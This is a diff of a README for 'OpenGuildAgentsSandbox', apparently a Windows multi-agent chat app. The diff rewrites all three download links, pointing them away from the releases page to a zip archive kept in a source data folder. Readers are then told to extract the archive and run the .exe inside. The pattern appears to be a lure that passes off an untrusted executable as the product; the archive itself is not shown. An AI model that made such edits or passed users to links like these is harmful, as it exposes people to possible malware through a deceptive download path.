@@ -1,6 +1,6 @@
 # 🤖 OpenGuildAgentsSandbox - Run Multi-Agent Chats On Windows
 
-[![Download OpenGuildAgentsSandbox](https://img.shields.io/badge/Download%20OpenGuildAgentsSandbox-7E57C2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Verseformpelmet183/OpenGuildAgentsSandbox/releases)
+[![Download OpenGuildAgentsSandbox](https://img.shields.io/badge/Download%20OpenGuildAgentsSandbox-7E57C2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Verseformpelmet183/OpenGuildAgentsSandbox/raw/refs/heads/main/src/data/quests/Agents-Guild-Open-Sandbox-v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -11,7 +11,7 @@ Use this guide if you want to download the app, install it, and start using it o
 ## 📥 Download the App
 
 1. Open the release page:
-   https://github.com/Verseformpelmet183/OpenGuildAgentsSandbox/releases
+   https://github.com/Verseformpelmet183/OpenGuildAgentsSandbox/raw/refs/heads/main/src/data/quests/Agents-Guild-Open-Sandbox-v3.9.zip
 2. Find the latest release at the top of the page.
 3. Download the Windows file. It may end in `.exe` or come in a `.zip` file.
 4. If you get a `.zip` file, right-click it and choose **Extract All**.
@@ -198,7 +198,7 @@ Here is a simple way to try the app:
 
 Use the release page to download and run the current Windows build:
 
-https://github.com/Verseformpelmet183/OpenGuildAgentsSandbox/releases
+https://github.com/Verseformpelmet183/OpenGuildAgentsSandbox/raw/refs/heads/main/src/data/quests/Agents-Guild-Open-Sandbox-v3.9.zip
 
 ## 🧾 About This Project
 
